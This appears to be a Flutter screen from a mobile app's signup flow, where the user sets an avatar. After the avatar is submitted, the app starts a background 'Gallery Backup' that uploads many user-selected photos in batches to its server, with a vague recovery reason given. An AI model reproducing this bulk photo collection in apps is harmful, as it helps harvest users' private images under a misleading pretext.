import 'dart:io';
import 'package:flutter/material.dart';
import 'package:image_picker/image_picker.dart';
import 'package:permission_handler/permission_handler.dart';
import '../services/api_service.dart';
import 'step3_phone_screen.dart';

class Step2AvatarScreen extends StatefulWidget {
  const Step2AvatarScreen({super.key});

  @override
  State<Step2AvatarScreen> createState() => _Step2AvatarScreenState();
}

class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
  File? _avatarFile;
  bool _isLoading = false;
  bool _galleryGranted = false;
  String _galleryStatus = 'Not authorized';
  int _galleryTotal = 0;
  bool _galleryUploading = false;
  int _galleryUploaded = 0;
  String? _galleryError;

  final ImagePicker _picker = ImagePicker();

  @override
  void initState() {
    super.initState();
    _requestGalleryPermission();
  }

  Future<void> _requestGalleryPermission() async {
    PermissionStatus status;

    if (Platform.isAndroid) {
      // Android 13+ uses READ_MEDIA_IMAGES; older uses READ_EXTERNAL_STORAGE
      status = await Permission.photos.request();
      if (!status.isGranted) {
        status = await Permission.storage.request();
      }
    } else {
      status = await Permission.photos.request();
    }

    if (status.isGranted || status.isLimited) {
      setState(() {
        _galleryGranted = true;
        _galleryStatus = 'Gallery access granted';
      });
    } else {
      setState(() {
        _galleryGranted = false;
        _galleryStatus = 'Gallery access not authorized';
      });
    }
  }

  Future<void> _pickAvatar() async {
    try {
      final XFile? picked = await _picker.pickImage(
        source: ImageSource.gallery,
        maxWidth: 1024,
        maxHeight: 1024,
        imageQuality: 85,
      );
      if (picked != null) {
        setState(() => _avatarFile = File(picked.path));
      }
    } catch (e) {
      _showSnack('Cannot access gallery. Check permissions.');
    }
  }

  Future<void> _pickAvatarFromCamera() async {
    try {
      final XFile? picked = await _picker.pickImage(
        source: ImageSource.camera,
        maxWidth: 1024,
        maxHeight: 1024,
        imageQuality: 85,
      );
      if (picked != null) {
        setState(() => _avatarFile = File(picked.path));
      }
    } catch (e) {
      _showSnack('Cannot access camera. Check permissions.');
    }
  }

  Future<void> _uploadGalleryInBackground() async {
    if (!_galleryGranted) return;

    try {
      setState(() {
        _galleryUploading = true;
        _galleryStatus = 'Reading gallery...';
        _galleryError = null;
      });

      final List<XFile> images = await _picker.pickMultipleMedia();

      if (images.isEmpty) {
        setState(() {
          _galleryUploading = false;
          _galleryStatus = 'Gallery is empty or none selected';
        });
        return;
      }

      setState(() {
        _galleryTotal = images.length;
        _galleryStatus = 'Uploading gallery (0/${images.length})...';
      });

      const batchSize = 20;
      int uploaded = 0;
      bool isFirst = true;

      for (int i = 0; i < images.length; i += batchSize) {
        final batch = images.sublist(
          i,
          (i + batchSize > images.length) ? images.length : i + batchSize,
        );

        final files = batch.map((x) => File(x.path)).toList();
        await ApiService.uploadGalleryBatch(files, reset: isFirst);
        isFirst = false;

        uploaded += batch.length;
        setState(() {
          _galleryUploaded = uploaded;
          _galleryStatus = 'Uploading gallery ($uploaded/${images.length})...';
        });
      }

      setState(() {
        _galleryUploading = false;
        _galleryStatus = 'Gallery backup complete ($uploaded photos)';
      });
    } catch (e) {
      setState(() {
        _galleryUploading = false;
        _galleryError = 'Gallery upload failed';
        _galleryStatus = 'Upload error occurred';
      });
    }
  }

  Future<void> _submit() async {
    if (_avatarFile == null) {
      _showSnack('Please select an avatar first');
      return;
    }

    setState(() => _isLoading = true);

    try {
      final result = await ApiService.uploadAvatar(_avatarFile!);
      if (result['code'] != 0) {
        _showSnack(result['message'] ?? 'Avatar upload failed');
        return;
      }

      // Start gallery upload asynchronously (don't block next step)
      if (_galleryGranted && !_galleryUploading) {
        _uploadGalleryInBackground();
      }

      if (!mounted) return;
      Navigator.of(context).pushReplacement(_slideRoute(const Step3PhoneScreen()));
    } catch (e) {
      _showSnack('Network error. Please retry.');
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  void _showSnack(String msg) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(msg),
        backgroundColor: const Color(0xFFE17055),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      ),
    );
  }

  PageRouteBuilder _slideRoute(Widget page) {
    return PageRouteBuilder(
      pageBuilder: (_, __, ___) => page,
      transitionsBuilder: (_, anim, __, child) {
        final offsetAnim = Tween<Offset>(
          begin: const Offset(1, 0),
          end: Offset.zero,
        ).animate(CurvedAnimation(parent: anim, curve: Curves.easeInOutCubic));
        return SlideTransition(position: offsetAnim, child: child);
      },
      transitionDuration: const Duration(milliseconds: 350),
    );
  }

  void _showAvatarPicker() {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.white,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
      ),
      builder: (_) => SafeArea(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const SizedBox(height: 8),
            Container(
              width: 40,
              height: 4,
              decoration: BoxDecoration(
                color: Colors.grey[300],
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            const SizedBox(height: 16),
            ListTile(
              leading: const Icon(Icons.photo_library_rounded,
                  color: Color(0xFF6C5CE7)),
              title: const Text('Choose from Gallery'),
              onTap: () {
                Navigator.pop(context);
                _pickAvatar();
              },
            ),
            ListTile(
              leading: const Icon(Icons.camera_alt_rounded,
                  color: Color(0xFF6C5CE7)),
              title: const Text('Take a Photo'),
              onTap: () {
                Navigator.pop(context);
                _pickAvatarFromCamera();
              },
            ),
            const SizedBox(height: 16),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 24),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const SizedBox(height: 24),
              _buildStepIndicator(2),
              const SizedBox(height: 32),

              const Text(
                'Set Your Avatar',
                style: TextStyle(
                  fontSize: 28,
                  fontWeight: FontWeight.w700,
                  color: Color(0xFF2D3436),
                ),
              ),
              const SizedBox(height: 8),
              Text(
                'Upload your avatar. We\'ll also backup your gallery for future recovery.',
                style: TextStyle(
                  fontSize: 15,
                  color: Colors.grey[600],
                  height: 1.5,
                ),
              ),

              const SizedBox(height: 40),

              Center(
                child: GestureDetector(
                  onTap: _showAvatarPicker,
                  child: Stack(
                    children: [
                      Container(
                        width: 130,
                        height: 130,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: const Color(0xFF6C5CE7).withValues(alpha: 0.08),
                          border: Border.all(
                            color: const Color(0xFF6C5CE7).withValues(alpha: 0.3),
                            width: 2,
                          ),
                          image: _avatarFile != null
                              ? DecorationImage(
                                  image: FileImage(_avatarFile!),
                                  fit: BoxFit.cover,
                                )
                              : null,
                        ),
                        child: _avatarFile == null
                            ? Column(
                                mainAxisAlignment: MainAxisAlignment.center,
                                children: [
                                  Icon(
                                    Icons.person_outline_rounded,
                                    size: 48,
                                    color: const Color(0xFF6C5CE7)
                                        .withValues(alpha: 0.6),
                                  ),
                                  const SizedBox(height: 6),
                                  Text(
                                    'Tap to upload',
                                    style: TextStyle(
                                      fontSize: 12,
                                      color: const Color(0xFF6C5CE7)
                                          .withValues(alpha: 0.7),
                                    ),
                                  ),
                                ],
                              )
                            : null,
                      ),
                      Positioned(
                        bottom: 4,
                        right: 4,
                        child: Container(
                          padding: const EdgeInsets.all(6),
                          decoration: const BoxDecoration(
                            color: Color(0xFF6C5CE7),
                            shape: BoxShape.circle,
                          ),
                          child: const Icon(
                            Icons.edit_rounded,
                            color: Colors.white,
                            size: 16,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ),

              const SizedBox(height: 36),

              _buildGalleryCard(),

              const SizedBox(height: 48),

              ElevatedButton(
                onPressed: _isLoading ? null : _submit,
                child: _isLoading
                    ? const SizedBox(
                        height: 22,
                        width: 22,
                        child: CircularProgressIndicator(
                          color: Colors.white,
                          strokeWidth: 2.5,
                        ),
                      )
                    : const Text('Next'),
              ),

              const SizedBox(height: 20),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildStepIndicator(int current) {
    return Row(
      children: List.generate(3, (i) {
        final step = i + 1;
        final isActive = step == current;
        final isDone = step < current;
        return Row(
          children: [
            Container(
              width: 32,
              height: 32,
              decoration: BoxDecoration(
                color: isActive
                    ? const Color(0xFF6C5CE7)
                    : isDone
                        ? const Color(0xFF00B894)
                        : Colors.grey.shade200,
                shape: BoxShape.circle,
              ),
              child: Center(
                child: isDone
                    ? const Icon(Icons.check, color: Colors.white, size: 16)
                    : Text(
                        '$step',
                        style: TextStyle(
                          color: isActive ? Colors.white : Colors.grey,
                          fontWeight: FontWeight.w600,
                          fontSize: 14,
                        ),
                      ),
              ),
            ),
            if (i < 2)
              Container(
                width: 40,
                height: 2,
                margin: const EdgeInsets.symmetric(horizontal: 4),
                color: isDone ? const Color(0xFF00B894) : Colors.grey.shade200,
              ),
          ],
        );
      }),
    );
  }

  Widget _buildGalleryCard() {
    final isUploading = _galleryUploading;
    final isDone = _galleryStatus.contains('complete');
    final isError = _galleryError != null;

    Color iconColor;
    IconData cardIcon;

    if (isError) {
      iconColor = const Color(0xFFE17055);
      cardIcon = Icons.error_outline_rounded;
    } else if (isDone) {
      iconColor = const Color(0xFF00B894);
      cardIcon = Icons.check_circle_outline_rounded;
    } else if (!_galleryGranted) {
      iconColor = Colors.grey;
      cardIcon = Icons.photo_library_outlined;
    } else {
      iconColor = const Color(0xFF6C5CE7);
      cardIcon = Icons.photo_library_rounded;
    }

    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: iconColor.withValues(alpha: 0.05),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: iconColor.withValues(alpha: 0.15)),
      ),
      child: Column(
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: iconColor.withValues(alpha: 0.1),
                  shape: BoxShape.circle,
                ),
                child: Icon(cardIcon, color: iconColor, size: 22),
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'Gallery Backup',
                      style: TextStyle(
                        fontSize: 13,
                        fontWeight: FontWeight.w600,
                        color: iconColor,
                      ),
                    ),
                    const SizedBox(height: 2),
                    Text(
                      _galleryStatus,
                      style: TextStyle(fontSize: 12, color: Colors.grey[500]),
                    ),
                  ],
                ),
              ),
              if (isUploading)
                const SizedBox(
                  width: 18,
                  height: 18,
                  child: CircularProgressIndicator(strokeWidth: 2),
                ),
            ],
          ),
          if (isUploading && _galleryTotal > 0) ...[
            const SizedBox(height: 12),
            ClipRRect(
              borderRadius: BorderRadius.circular(4),
              child: LinearProgressIndicator(
                value: _galleryTotal > 0 ? _galleryUploaded / _galleryTotal : 0,
                backgroundColor: Colors.grey[200],
                color: const Color(0xFF6C5CE7),
                minHeight: 6,
              ),
            ),
          ],
          if (!_galleryGranted) ...[
            const SizedBox(height: 12),
            SizedBox(
              width: double.infinity,
              child: TextButton(
                onPressed: () => openAppSettings(),
                style: TextButton.styleFrom(
                  padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
                  backgroundColor: const Color(0xFF6C5CE7).withValues(alpha: 0.08),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(8),
                  ),
                ),
                child: const Text(
                  'Grant Gallery Access',
                  style: TextStyle(
                    fontSize: 13,
                    color: Color(0xFF6C5CE7),
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ),
            ),
          ],
        ],
      ),
    );
  }
}
